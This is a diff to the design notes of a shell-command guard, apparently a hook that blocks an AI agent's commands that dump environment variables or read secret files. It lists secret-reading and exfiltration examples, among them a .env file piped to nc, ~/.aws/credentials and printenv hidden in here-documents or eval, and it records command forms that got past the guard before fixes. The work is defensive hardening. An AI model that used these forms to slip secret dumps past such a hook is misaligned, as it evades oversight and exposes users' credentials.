@@ -959,11 +959,13 @@ is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
 ### Launchers, substitutions and manager environments (2026-09-29)
 
 A coverage review of the guard's own rules on 2026-09-29 found command forms it read too little of, each a way a stored
-value could be shown or forwarded by mistake, and a repair round the same day fixed what a read-only review of that work
-found. Each form gets the verdict of its plain equivalent where stated below. No rule was loosened (a command the guard
-blocked before is blocked now), and `tests/test_secret_path_guard.py` keeps every earlier row except two that recorded
-the `systemd-run` gap and moved from `EXPECTED_PASS_THROUGH` to `BLOCKED`. The guard is a text reader of one line of
-shell, not a shell: what it does not read is listed at the end of this subsection.
+value could be shown or forwarded by mistake, and repair rounds the same day fixed what read-only reviews of that work
+found. Each form gets the verdict of its plain equivalent where stated below. One rule was loosened, on purpose and only
+for the value of a clustered value-taking `ps` option (see "Loosenings" below); every other change tightens, so a
+command that the base guard (main at c26800f3) blocked is blocked now unless it is one of those, and
+`tests/test_secret_path_guard.py` keeps every earlier row except two that recorded the `systemd-run` gap and moved from
+`EXPECTED_PASS_THROUGH` to `BLOCKED`. The guard is a text reader of one line of shell, not a shell: what it does not
+read is listed at the end of this subsection.
 
 - **systemd's launchers are modelled: `systemd-run`, `run0`, `systemd-inhibit`, `systemd-cat`.** Each one's own options
   are skipped as getopt reads them, redirections between them included (`systemd-run --user 2>/tmp/log --pipe printenv`),
@@ -1000,54 +1002,37 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
   A backquote inside a single-quoted string is text for the shell that string is handed to, so
   `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
-- **Here-documents are not read as such; one strict idiom is exempt (2026-09-29).** A here-document's lines are command
-  lines like any other, as the tokenizer has always read them at the top level, so code or prose in a body is read as
-  commands, and a `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed
-  by `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not. The guard read them specially for
-  a time (a quoted delimiter made the body data inside a double-quoted substitution, so
-  `git commit -m "$(cat <<'EOF' ... EOF)"` passed whatever its prose said), and the independent verification review of
-  that reading (172596ed, 2026-09-29) found that it needs bash-exact parsing of delimiters and terminators, and that each
-  slip erased executable text: an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its
-  terminator, an arithmetic command such as `((1 << "2"))` and a quoted `#` made it take real commands for data, a shell
-  that reads the body (`echo "$(bash <<'EOF' ... EOF)"`) was not read, and `eval "$(cat <<'EOF' ... EOF)"` and
-  `bash -c "$(...)"` ran what the base guard refused. That reading, with its terminator tracking and delimiter decoding,
-  is gone. What replaced it is one exemption, a strict canonical idiom, looked for in the text as written (before the guard
-  joins backslash-newline pairs): a double-quoted word that is exactly `"$(`, blanks, `cat`, blanks, `<<` or `<<-`,
-  blanks, `'IDENT'` (single quotes; IDENT of letters, digits and `_`, not starting with a digit), nothing else but blanks
-  on that line, a newline, the body lines, the first line that is exactly IDENT (for `<<-` after its leading tabs; no other
-  trimming, no carriage return), then only blanks and newlines and `)"`, standing alone as a word (after a blank or at the
-  start, before a blank, the end or one of `;&|)<>`). Where the command that receives it, after the reserved words,
-  assignments, wrappers and launchers the guard models, is `git`, `gh`, `echo` or `printf` and the idiom is a word of its
-  own after that program, the command reading sees a neutral word in its place; the raw-text rules (store paths, secret
-  names and expansions, `/proc`) keep reading the whole text as they always did. Every other shape keeps the reading of its
-  body lines as commands: a `\EOF`, `"EOF"`, `$'EOF'` or an unquoted delimiter, another first command (`cat -n`, `tee`,
-  `/bin/cat`), text on the operator line (`| sh`), text after the terminator (if a body line equals IDENT, the first such
-  line is the terminator and only `)"` may follow it), an unterminated body, a word glued to what precedes or follows it
-  (`--body="$(...)"`), the same idiom behind any other program (a shell with `-c`, `eval`, an interpreter, `source`,
-  `xargs`, `watch`, `ssh`, `cat`, `tee`, an assignment, the command position) or inside the text of any command
-  substitution, quoted or not (`eval $(echo "$(cat <<'EOF' ... EOF)")` runs what the substitution prints, and the tokenizer
-  splits an unquoted `$(echo ...)` into a segment of its own whose command is `echo`; a subshell `( ... )` or a brace group is
-  no substitution), and a text the guard cannot read (an unbalanced quote, for instance an apostrophe in an earlier
-  here-document's prose; the private-use characters U+E001 and U+E002): its words are a guess, and a guess is no reason
-  to hide a body. The cost is
-  friction, in the strict direction: a body line that starts with `printenv` or `env`, or holds `$(printenv)`, is refused
-  outside the idiom, and an unquoted here-document in a substitution (`echo "$(cat <<EOF`, `printenv`, `EOF`) is an
-  `environment_dump` as it is at the top level. Write such text with the Write tool and pass the path (`git commit -F
-  FILE`). Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: a git or gh option that runs its value
-  (`git rebase --exec "$(cat <<'EOF' ... EOF)"`, `gh alias set`), an echo whose output is piped into a shell or written
-  into a script that runs later, and an unquoted here-document that expands `$(...)` between single quotes
-  (`cat <<EOF` with `'$(printenv)'` in its body), which the base guard passed too. Measured 2026-09-29 with the guard of
-  commit 660e6812: of the 1,960 distinct commit messages on all refs of this repository (`git log --all`, a count that
-  grows), in the `git commit -m` and `gh pr create --body` patterns, the guard refuses 10 (each names a secret variable,
-  a store path or a token command in prose, which the raw-text rules read) and the base guard 14, and 5 messages that
-  the base guard refused (its quote parity read prose as commands) pass; a matrix of 40 consumers, 18 launcher
-  prefixes, 5 here-document forms, 8 payloads and 4 substitution forms (115,200 commands) loosens no row against the
-  base guard; a differential over 62,365 derived commands loosens 102, every one a `ps -fu steve` or `ps -fu eve` (the
-  second loosening, below); a grammar fuzz of launcher chains with redirections and idiom placements (10 seeds of
-  60,000 commands) loosens none; and mutation fuzz of 25,140 mutants of 419 blocked strings loosens 33 to 44 per seed,
-  29 to 38 of them variants of those two `ps` rows and 4 to 6 of them mutants whose broken terminator leaves a real
-  quoted body that bash prints and does not run (`echo "$(cat <<'EOF'`, `text\`, `E`, `# c`, `OF`, `echo "$(printenv)"`
-  ... `EOF`).
+- **Here-documents are not read as such, and none is exempt (2026-09-29).** A here-document's lines are command lines like
+  any other, as the tokenizer has always read them at the top level, so code or prose in a body is read as commands, and a
+  `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed by
+  `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not, and so is
+  `git commit -m "$(cat <<'EOF' ... EOF)"` when a line of its prose reads as a dump. The guard read them specially for a
+  time, and two independent verification reviews (of 172596ed and of 50ca6ca2, 2026-09-29) found that every such reading
+  needs bash-exact parsing and that each slip hid executable text. The general reading (a quoted delimiter made the body
+  data inside a double-quoted substitution) let `eval "$(cat <<'EOF' ... EOF)"` and `bash -c "$(...)"` through and lost
+  text to an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its terminator, an arithmetic
+  command such as `((1 << "2"))` and a quoted `#`. Its replacement, one exemption for a strict canonical idiom behind `git`,
+  `gh`, `echo` and `printf`, let six more through: an idiom head inside another here-document's body that swallowed its
+  terminator, an idiom inside an unquoted here-document that a shell reads, an `echo` piped into `sh`,
+  `git rebase --exec`, a case pattern's `)` that closed a substitution early, and a process substitution that runs a
+  shell. Both readings are gone. What a substitution prints is code for a shell, `eval`, an interpreter, `source`, `xargs`,
+  `ssh` and `git rebase --exec`, a file name for a reader, and only text for `git commit -m`; telling those apart from
+  the words of one command line is what failed twice, so no consumer is trusted and every body is read as command lines,
+  as the base guard read a top-level body. The cost is friction, in the strict direction. A commit message or
+  pull-request body written through `"$(cat <<'EOF' ... EOF)"` is refused when a line of its prose starts with
+  `printenv` or `env` or holds `printenv` in backquotes (behind `git`, `gh`, `echo` and `printf` too), a literal
+  `$(printenv)` example inside a quoted here-document is refused in file-writing (`cat > note.md <<'EOF'`), Python
+  (`python3 <<'PY'`), commit-message (`git commit -F - <<'EOF'`) and pull-request-comment
+  (`gh pr comment --body-file - <<'EOF'`) workflows, and Python's `set()` after a comment line in an interpreter's
+  here-document (`# unique values` and then `print(len(set([1, 1])))`) is refused as the shell's `set`: the base guard's
+  `#` hole hid it, and reading an interpreter's here-document as that interpreter's code is a later change. Write such
+  text with the Write tool and pass the path: `git commit -F FILE`, `gh pr create --body-file FILE`, a script file for the
+  interpreter. Measured 2026-09-29: of the 2,015 distinct commit messages on all refs of this repository (`git log
+  --all`, a count that grows), in the `git commit -m` and `gh pr create --body` patterns, this guard refuses 36 and the
+  base guard 16, and none that the base guard refuses passes; the five real messages that `tests/test_secret_path_guard.py`
+  records (`REAL_COMMIT_MESSAGES`) are among them. Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: an
+  unquoted here-document that expands `$(...)` between single quotes (`cat <<EOF` with `'$(printenv)'` in its body),
+  which the base guard passed too.
 - **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
   with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
   rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
@@ -1115,7 +1100,7 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   `set < FILE` still print every variable (`set a b` sets positional parameters), so they are an `environment_dump` now;
   the base guard passed them, and without this the redirection that a keyring exec's arguments carry to the command it
   starts would have made `exec name VAR < FILE -- set` pass, which the base guard refused (found by a grammar fuzz of
-  600,000 launcher chains and idiom placements against the base guard, now 0 looser).
+  600,000 launcher chains with redirections against the base guard, now 0 looser).
 - **An internal error blocks; a timeout does not.** Only exit 2 blocks a PreToolUse call. `main()` now catches any
   exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
   `blocked (guard_error)`, that names no command text and prints no traceback. A hook that runs past its timeout is
@@ -1123,10 +1108,9 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
   the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why each text is
   scanned in one pass (a stack of frames and a regular expression that jumps between the characters that matter, not
-  a rescan per arithmetic shift or per nesting level), the terminator of the canonical idiom is found by a binary search
-  in a line index built once and the text after it is matched once per terminator, a chain of `env`, `rtk` or
-  `systemd-run` launchers is walked by index instead of copying the rest of the command at every hop, and the bodies
-  read behind double-quoted substitutions are capped at 32 levels and at four times the command's length plus 64 KiB.
+  a rescan per arithmetic shift or per nesting level), a chain of `env`, `rtk` or `systemd-run` launchers is walked by
+  index instead of copying the rest of the command at every hop, and the bodies read behind double-quoted substitutions
+  are capped at 32 levels and at four times the command's length plus 64 KiB.
   Measured on this host with the inputs of `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the
   substitution scan took 10 s on 12,000 here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on
   60,000 nested `systemd-run`; the launcher walk that predates this work took 29 s on 20,000 nested `env` and 56 s on
@@ -1139,15 +1123,15 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   file with the Write tool and pass the path): measured that day, one quoted word of 1,000,000 characters took 10.2 to
   13.0 s in `check()` (the base guard too), 600,000 took 3.8 to 4.4 s, 500,000 took 2.9 to 3.3 s and 200,000 took 0.6 s,
   and a hook that times out blocks nothing. The limit is low enough that both readings of a command always run inside
-  the timeout, so no reading is skipped above some length; the slowest input of about 199,000 characters found (a
-  double-quoted text holding `#` throughout, plus one canonical idiom) took 3.3 s in `check()`. `check()` itself has no
-  size limit. A substitution nested beyond the caps above is still not read.
-- **Loosenings against the base guard (c26800f3), 2026-09-29: two.** Everything else this work changes tightens. (1) The
-  canonical idiom (see the here-document item) passes behind `git`, `gh`, `echo` and `printf`, where the base guard
-  refused a commit message whose quote parity it misread or whose lines it read as commands (5 of this repository's
-  commit messages, measured in that item). (2) `ps -fu steve` and `ps -fu eve` pass, since `-u` takes a value
-  (`ps -u steve` and `ps -fu Eve` passed before). Each has rows in `tests/test_secret_path_guard.py` (ALLOWED), and the
-  probe of the review, base guard against this one, reports `loosened rows: 0` apart from them.
+  the timeout, so no reading is skipped above some length; the slowest of seven shapes of about 199,000 characters (a
+  double-quoted or single-quoted text holding `#` throughout, ANSI-C strings, backquotes, subshells) took 1.0 s in
+  `check()`. `check()` itself has no size limit. A substitution nested beyond the caps above is still not read.
+- **Loosenings against the base guard (c26800f3), 2026-09-29: one.** Everything else this work changes tightens. The
+  value of a clustered value-taking `ps` option is no BSD flag cluster: `ps -fu steve` and `ps -fu eve` pass, since `-u`
+  takes a value (`ps -u steve` and `ps -fu Eve` passed before), and so do `ps -fo user` and `ps -ft e`; the base guard
+  read the word after such a cluster as a dashless `ps eww` and refused it. Each has rows in
+  `tests/test_secret_path_guard.py` (ALLOWED), and the probe of the review, base guard against this one, reports
+  `loosened rows: 0` apart from them.
 - **Alternatives considered for reading shell syntax (2026-09-29).** A full shell parser was not adopted: the hook is one
   standard-library file that the profile installer copies verbatim to the host, and each candidate would have to be
   vendored per platform and started per call. `bashlex` 0.18 (PyPI 2023-01-18, GitHub last pushed 2024-04-08, GPL-3.0)
